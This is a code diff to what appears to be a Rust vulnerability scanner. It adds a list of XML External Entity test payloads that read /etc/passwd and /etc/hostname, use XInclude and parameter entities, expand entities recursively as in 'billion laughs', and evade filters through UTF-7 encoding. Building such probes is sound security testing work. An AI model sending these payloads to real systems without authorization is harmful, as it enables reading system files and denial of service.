@@ -650,6 +650,18 @@ fn build_default_templates() -> Vec<(VulnerabilityClass, Vec<String>)> {
             ],
         ),
         (
+            VulnerabilityClass::XmlExternalEntity,
+            vec![
+                "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>".to_string(),
+                "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><root>&xxe;</root>".to_string(),
+                "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>".to_string(),
+                "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\">%xxe;]><root>test</root>".to_string(),
+                "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;\">]><root>&lol3;</root>".to_string(),
+                "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///nonexistent_aegis_probe\">]><root>&xxe;</root>".to_string(),
+                "<?xml version=\"1.0\" encoding=\"UTF-7\"?>+ADw-!DOCTYPE foo +AFs-+ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-+ADw-root+AD4-+ACY-xxe;+ADw-/root+AD4-".to_string(),
+            ],
+        ),
+        (
             VulnerabilityClass::NoSqlInjection,
             vec![
                 // MongoDB operator injection (JSON body)
